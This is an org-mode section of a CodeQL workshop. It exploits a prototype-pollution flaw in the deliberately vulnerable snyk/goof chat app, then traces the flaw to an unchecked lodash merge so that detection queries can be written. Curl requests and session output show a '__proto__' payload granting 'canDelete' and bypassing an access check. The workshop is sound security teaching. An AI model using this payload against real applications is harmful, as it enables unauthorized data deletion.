javascript/codeql-js-goof-workshop/workshop.org
** Exploit the snyk/goof Application
   This is a concise run to exploit the prototype injection of [[https://github.com/snyk/goof][snyk/goof]].  For a
   complete walkthrough, see [[*Appendix E: Complete Setup and Exploit of the snyk/goof Application][Appendix E: Complete Setup and Exploit of the
   snyk/goof Application]].

   For the workshop we only need to collect vulnerability information; once goof
   is running, we try the prototype-pollution exploits:
   #+BEGIN_SRC sh
     # Check exploits
     bash
     . ~/local/goof/exploits/prototype-pollution.sh

     # Try c1 through c4 and exploit:
     List messages
             hohn@gh-hohn ~/local/goof/exploits
             0:$ c1
             []

     Send some messages
             hohn@gh-hohn ~/local/goof/exploits
             0:$ c2
             {"ok":true}
             hohn@gh-hohn ~/local/goof/exploits
             0:$ c2
             {"ok":true}

     List again
             hohn@gh-hohn ~/local/goof/exploits
             0:$ c1
             [{"icon":"👋","text":"Hi!","id":1,"timestamp":1602276330967,"userName":"user"},
              {"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"}]

     Try to delete
             hohn@gh-hohn ~/local/goof/exploits
             0:$ c4
             {"ok":false,"error":"Access denied"}

     Use exploit
             hohn@gh-hohn ~/local/goof/exploits
             0:$ c3
             {"ok":true}

     Try to delete again
             hohn@gh-hohn ~/local/goof/exploits
             130:$ c4
             {"ok":true}

     Notice message 1 is gone:
             hohn@gh-hohn ~/local/goof/exploits
             0:$ c1
             [{"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"},
              {"icon":"👋","text":"😈","id":3,"timestamp":1602276340962,"userName":"user"}]
   #+END_SRC


   Now let's examine the exploits and see what happened.  The requests sent are
   #+BEGIN_SRC sh
     // c2, safe
     {
         curl --request PUT \
           --url "$GOOF_HOST/chat" \
           --header 'content-type: application/json' \
           --data '{"auth": {"name": "user", "password": "pwd"}, 
                    "message": {"text": "Hi!"}}'
     }

     // c3, the exploit:
     {
         curl --request PUT \
           --url "$GOOF_HOST/chat" \
           --header 'content-type: application/json' \
           --data '{"auth": {"name": "user", "password": "pwd"}, 
                    "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
     }

     // c4, the delete request
     {
         curl --request DELETE \
           --url "$GOOF_HOST/chat" \
           --header 'content-type: application/json' \
           --data '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
     }
   #+END_SRC

   The first two are PUT requests to the URL =$GOOF_HOST/chat=, but the json messages differ:
   #+BEGIN_SRC javascript
        // safe
        {"auth": {"name": "user", "password": "pwd"}, 
         "message": {"text": "Hi!"}}

        // exploit
        {"auth": {"name": "user", "password": "pwd"}, 
         "message": { "text": "😈", "__proto__": {"canDelete": true}}}
   #+END_SRC

   The =__proto__= change allows the delete request to succeed.

** Find problems in source code
   Next, we need to see where and why this is causing the problem in the
   application.  A short inspection of the source code sheds some light on this
   issue. 

   The app entry point is seen from the startup command:
   #+BEGIN_SRC sh
     node app.js                     # from ~/local/goof/package.json
   #+END_SRC

   For prototype pollution, the c3 send is a http PUT to =$GOOF_HOST/chat=, with an
   invalid =message=:
   #+BEGIN_SRC sh
     curl --request PUT \
       --url "$GOOF_HOST/chat" \
       --header 'content-type: application/json' \
       --data '{"auth": {"name": "user", "password": "pwd"}, 
                "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
   #+END_SRC

   Inspect the code to track these;  starting from =app.js=, we see that
   #+BEGIN_SRC js
     // requests are passed through to routes.chat.add via 
     app.put('/chat', routes.chat.add);
   #+END_SRC
   and in =index.js= line 259, =routes.chat.add=, we see that
   #+BEGIN_SRC javascript
      // requests pass into 
      exports.chat.add(req, res)
      // where the the incoming req.body.message directly merged without checks:
      _.merge(message, req.body.message, {...})
      // so message (an {}) now has "__proto__": {"canDelete": true}
   #+END_SRC

   This can be seen using the debugger in VS Code; see [[*Appendix A: Trace the exploit in the VS Code JS Debugger][Appendix A: Trace the
   exploit in the VS Code JS Debugger]] for details.

   Key information for the later queries:
   - the request entry through =routes.chat.add()=
   - the request use in the =_.merge()= call

* CodeQL workshop for javascript, Part 2: Write query
  With the known vulnerability and the information from above, 
  - the request data enters through =routes.chat.add()=
  - the request's data is used in the =_.merge()= call
  we can now proceed to write queries to find these problems.

